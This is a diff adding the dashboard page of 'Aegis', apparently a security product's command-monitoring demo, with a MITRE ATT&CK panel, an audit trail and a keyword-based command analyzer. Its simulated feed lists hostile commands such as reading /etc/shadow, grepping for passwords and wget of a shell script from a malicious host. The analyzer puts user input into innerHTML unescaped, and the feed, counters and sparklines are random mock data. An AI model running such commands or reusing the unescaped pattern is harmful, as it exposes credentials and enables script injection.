+            <input class="cmd-input" id="cmdInput" type="text" placeholder="enter command to analyze..." autocomplete="off"/>
+          </div>
+          <button class="cmd-btn" onclick="analyzeCommand()">Analyze Command</button>
+          <div style="margin-top:12px">
+            <div class="cmd-result" id="cmdResult"></div>
+          </div>
+        </div>
+      </div>
+
+      <!-- MITRE ATT&CK HEATMAP -->
+      <div class="panel">
+        <div class="panel-header">
+          <div class="panel-title">MITRE ATT&CK Coverage</div>
+          <div class="panel-badge badge-mitre">ATT&CK v14</div>
+        </div>
+        <div class="mitre-grid">
+          <div class="mitre-cell active">
+            <div class="mitre-id">T1059</div>
+            <div class="mitre-name">Command Execution</div>
+          </div>
+          <div class="mitre-cell active">
+            <div class="mitre-id">T1548</div>
+            <div class="mitre-name">Privilege Escalation</div>
+          </div>
+          <div class="mitre-cell active">
+            <div class="mitre-id">T1003</div>
+            <div class="mitre-name">Credential Dump</div>
+          </div>
+          <div class="mitre-cell warn-active">
+            <div class="mitre-id">T1033</div>
+            <div class="mitre-name">User Discovery</div>
+          </div>
+          <div class="mitre-cell warn-active">
+            <div class="mitre-id">T1070</div>
+            <div class="mitre-name">Indicator Removal</div>
+          </div>
+          <div class="mitre-cell">
+            <div class="mitre-id">T1055</div>
+            <div class="mitre-name">Process Injection</div>
+          </div>
+          <div class="mitre-cell">
+            <div class="mitre-id">T1082</div>
+            <div class="mitre-name">System Info</div>
+          </div>
+          <div class="mitre-cell">
+            <div class="mitre-id">T1190</div>
+            <div class="mitre-name">Exploit Public App</div>
+          </div>
+          <div class="mitre-cell">
+            <div class="mitre-id">T1021</div>
+            <div class="mitre-name">Remote Services</div>
+          </div>
+          <div class="mitre-cell">
+            <div class="mitre-id">T1560</div>
+            <div class="mitre-name">Archive Data</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- AUDIT TRAIL -->
+      <div class="panel">
+        <div class="panel-header">
+          <div class="panel-title">Cryptographic Audit Trail</div>
+          <div class="panel-badge badge-mitre">SHA-256</div>
+        </div>
+        <div class="audit-list">
+          <div class="audit-item">
+            <div class="audit-top">
+              <div class="audit-id">36c14569a8067ff3</div>
+              <div class="audit-time">2026-02-26T04:33:33Z</div>
+            </div>
+            <div class="audit-detail">
+              <strong>BLOCKED</strong> — cat /etc/shadow — Risk <strong>80/100</strong> — T1059.004, T1003
+            </div>
+          </div>
+          <div class="audit-item">
+            <div class="audit-top">
+              <div class="audit-id">6b558b5ed06e4791</div>
+              <div class="audit-time">2026-02-26T04:30:57Z</div>
+            </div>
+            <div class="audit-detail">
+              <strong>BLOCKED</strong> — sudo su - — Risk <strong>40/100</strong> — T1548
+            </div>
+          </div>
+          <div class="audit-item">
+            <div class="audit-top">
+              <div class="audit-id">f61881c5bd1acb02</div>
+              <div class="audit-time">2026-02-26T04:33:34Z</div>
+            </div>
+            <div class="audit-detail">
+              <strong>FLAGGED</strong> — whoami — Risk <strong>40/100</strong> — T1033 — Executed with monitoring
+            </div>
+          </div>
+          <div class="audit-item">
+            <div class="audit-top">
+              <div class="audit-id">a1f3e28c7d904b11</div>
+              <div class="audit-time">2026-02-26T04:14:02Z</div>
+            </div>
+            <div class="audit-detail">
+              <strong>ALLOWED</strong> — ls -la — Risk <strong>0/100</strong> — Clean execution
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- FOOTER -->
+  <div class="dash-footer">
+    <div class="footer-left">Aegis v1.0.0 — Hammer Defense Industries Corporation — All Rights Reserved</div>
+    <div class="footer-right">
+      <div class="footer-tag">TRL 6</div>
+      <div class="footer-tag">Zero Trust</div>
+      <div class="footer-tag">MITRE ATT&CK v14</div>
+      <div class="footer-tag">FedRAMP Ready</div>
+    </div>
+  </div>
+
+</div>
+
+<script>
+  // Live clock
+  function updateTime() {
+    const now = new Date();
+    const utc = now.toUTCString().split(' ')[4];
+    document.getElementById('navTime').textContent = utc + ' UTC';
+  }
+  setInterval(updateTime, 1000);
+  updateTime();
+
+  // Generate sparklines
+  function buildSparkline(id, type) {
+    const el = document.getElementById(id);
+    if (!el) return;
+    const heights = Array.from({length: 20}, () => Math.floor(Math.random() * 80) + 20);
+    el.innerHTML = heights.map((h, i) => {
+      const barType = type === 'blocked' ? 'blocked' :
+                      type === 'flagged' ? 'flagged' : 'safe';
+      return `<div class="spark-bar ${Math.random() > 0.6 ? barType : ''}" style="height:${h}%"></div>`;
+    }).join('');
+  }
+
+  buildSparkline('sparkTotal', 'safe');
+  buildSparkline('sparkBlocked', 'blocked');
+  buildSparkline('sparkFlagged', 'flagged');
+
+  // Command analyzer
+  const MITRE_MAP = {
+    'bash':   {id:'T1059.004', name:'Unix Shell'},
+    'sh':     {id:'T1059.004', name:'Unix Shell'},
+    'python': {id:'T1059.006', name:'Python Execution'},
+    'sudo':   {id:'T1548', name:'Privilege Escalation'},
+    'su':     {id:'T1548', name:'Privilege Escalation'},
+    'shadow': {id:'T1003', name:'Credential Dumping'},
+    'passwd': {id:'T1003', name:'Credential Dumping'},
+    'whoami': {id:'T1033', name:'User Discovery'},
+    'rm':     {id:'T1070', name:'Indicator Removal'},
+  };
+
+  function analyzeCommand() {
+    const input = document.getElementById('cmdInput').value.trim();
+    const result = document.getElementById('cmdResult');
+    if (!input) return;
+
+    const lower = input.toLowerCase();
+    const matches = [];
+    for (const [key, val] of Object.entries(MITRE_MAP)) {
+      if (lower.includes(key)) matches.push(val);
+    }
+
+    let risk = 0;
+    let status = 'ALLOWED';
+    let cls = 'success';
+
+    if (matches.length > 0) {
+      risk = Math.min(100, Math.max(40, matches.length * 20));
+    }
+
+    const isHardBlock = lower.includes('sudo su') || lower.includes('su -') || lower.includes('cat /etc/shadow');
+    if (isHardBlock) { risk = Math.max(risk, 80); }
+
+    if (isHardBlock || risk > 60) {
+      status = 'BLOCKED';
+      cls = 'blocked';
+    } else if (matches.length > 0) {
+      status = 'FLAGGED';
+      cls = 'flagged';
+    }
+
+    const auditId = Math.random().toString(36).substr(2, 16);
+    const mitreStr = matches.map(m => m.id).join(', ') || 'None';
+    const threat = risk > 70 ? 'CRITICAL' : risk > 40 ? 'HIGH' : risk > 0 ? 'MEDIUM' : 'CLEAN';
+
+    result.className = `cmd-result show ${cls}`;
+    result.innerHTML = `
+[${status}] Audit: ${auditId}<br>
+Command: ${input}<br>
+Risk Score: ${risk}/100 — Threat Level: ${threat}<br>
+MITRE Tags: ${mitreStr}<br>
+${status === 'BLOCKED' ? '→ Command blocked by zero-trust policy. Incident logged.' : status === 'FLAGGED' ? '→ Command executed under active monitoring.' : '→ Command cleared. No threats detected.'}
+    `;
+
+    // Animate counter
+    if (status === 'BLOCKED') {
+      const el = document.getElementById('blockedCmds');
+      const val = parseInt(el.textContent.replace(',','')) + 1;
+      el.textContent = val.toLocaleString();
+    } else if (status === 'FLAGGED') {
+      const el = document.getElementById('flaggedCmds');
+      const val = parseInt(el.textContent.replace(',','')) + 1;
+      el.textContent = val.toLocaleString();
+    }
+    const total = document.getElementById('totalCmds');
+    const tv = parseInt(total.textContent.replace(',','')) + 1;
+    total.textContent = tv.toLocaleString();
+  }
+
+  document.getElementById('cmdInput').addEventListener('keydown', e => {
+    if (e.key === 'Enter') analyzeCommand();
+  });
+
+  // Live feed ticker - add new events periodically
+  const commands = [
+    {cmd: 'ps aux', status: 'success', risk: 0, tags: []},
+    {cmd: 'cat /proc/version', status: 'flagged', risk: 40, tags: ['T1082']},
+    {cmd: 'wget http://malicious.io/shell.sh', status: 'blocked', risk: 80, tags: ['T1105']},
+    {cmd: 'grep -r password /etc/', status: 'blocked', risk: 80, tags: ['T1003']},
+    {cmd: 'id', status: 'flagged', risk: 40, tags: ['T1033']},
+    {cmd: 'uname -a', status: 'success', risk: 0, tags: []},
+  ];
+
+  let feedIdx = 0;
+  setInterval(() => {
+    const feed = document.getElementById('activityFeed');
+    const item = commands[feedIdx % commands.length];
+    feedIdx++;
+
+    const div = document.createElement('div');
+    div.className = 'feed-item';
+    div.style.opacity = '0';
+    div.style.animation = 'fadeIn 0.4s ease forwards';
+
+    const statusClass = item.status === 'blocked' ? 'status-blocked' : item.status === 'flagged' ? 'status-flagged' : 'status-success';
+    const statusText = item.status === 'blocked' ? 'BLOCKED' : item.status === 'flagged' ? 'FLAGGED' : 'ALLOWED';
+    const riskClass = item.risk >= 80 ? 'risk-80' : item.risk >= 40 ? 'risk-40' : 'risk-0';
+    const riskLabel = item.risk >= 80 ? 'CRITICAL' : item.risk >= 40 ? 'MEDIUM' : 'CLEAN';
+    const tagHtml = item.tags.map(t => `<span class="mitre-tag">${t}</span>`).join('');
+    const now = new Date();
+    const timeStr = now.toUTCString().split(' ')[4] + ' UTC';
+
+    div.innerHTML = `
+      <div class="feed-status ${statusClass}">${statusText}</div>
+      <div class="feed-content">
+        <div class="feed-cmd">${item.cmd}</div>
+        <div class="feed-meta"><span>User: operator_0${Math.floor(Math.random()*3)+1}</span><span>${timeStr}</span>${tagHtml}</div>
+      </div>
+      <div class="feed-risk">
+        <div class="risk-score ${riskClass}">${item.risk}</div>
+        <div class="risk-label">${riskLabel}</div>
+      </div>`;
+
+    feed.insertBefore(div, feed.firstChild);
+    if (feed.children.length > 12) feed.removeChild(feed.lastChild);
+  }, 4000);
+</script>
+</body>
+</html>
+
+
